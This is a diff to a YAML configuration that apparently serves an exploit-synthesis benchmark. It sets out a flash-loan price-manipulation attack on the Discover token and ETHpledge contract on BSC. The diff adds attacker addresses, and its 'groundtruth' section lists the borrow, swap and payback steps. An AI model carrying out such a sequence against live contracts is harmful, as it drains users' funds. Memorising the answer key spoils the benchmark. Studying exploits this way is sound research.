@@ -1,7 +1,6 @@
 project_name: "Discover"
 blockchain: "bsc"
 blocknumber: 18_446_845
-attacker_addr: "0x446247bb10B77D1BCa4D4A396E014526D1ABA277"
 attack_goal_str: "busd"
 
 contracts:
@@ -9,7 +8,9 @@ contracts:
   - ["disc", "Discover", "IERC20", "0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267"]
   - ["pair", "UniswapV2Pair", "IUniswapV2Pair", "0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d"]
   - ["ethpledge", "ETHpledge", "IETHpledge", "0xe732a7bD6706CBD6834B300D7c56a8D2096723A7"]
-  - ["owner", "", "", "0x8894E0a0c962CB723c1976a4421c95949bE2D4E3"]
+  - ["busdholder", "", "", "0x8894E0a0c962CB723c1976a4421c95949bE2D4E3"]
+  - ["attacker", "", "", "0x06B912354B167848a4A608a56BC26C680DAD3D79"]
+  - ["attacker1", "", "", "0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930"]
 
 roles:
   "busd":
@@ -27,19 +28,20 @@ roles:
   "ethpledge":
     is_swappair: true
     token_pair: ["busd", "disc"]
-  "owner":
+  "busdholder":
     is_lendpool: true
     lend_tokens: ["busd"]
 
 groundtruth:
-  - ["borrow", "busd", "owner", "19811e18"]
+  - ["borrow", "busd", "busdholder", "2100e18"]
+  - ["borrow", "busd", "pair", "19810e18"]
   - ["swap", "ethpledge", "attacker", "busd", "disc", "2000e18", "1"]
+  - ["payback", "busd", "pair", "19810e18 * 1003 / 1000"]
   - ["swap", "pair", "attacker", "disc", "busd", "disc.balanceOf(attacker)", "getAmountOut(address(pair), disc.balanceOf(attacker), address(disc)) * 9 / 10"]
-  - ["payback", "busd", "owner", "19811e18 * 1003 / 1000"]
+  - ["payback", "busd", "busdholder", "2100e18 * 1003 / 1000"]
 
 extra_actions:
   - "function swap_ethpledge_attacker_busd_disc(uint256 amount, uint256 amountOut) internal foray {
-    address attacker1 = address(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930);
     busd.approve(address(ethpledge), type(uint256).max);
     ethpledge.pledgein(attacker1, amount);
     vm.stopPrank();
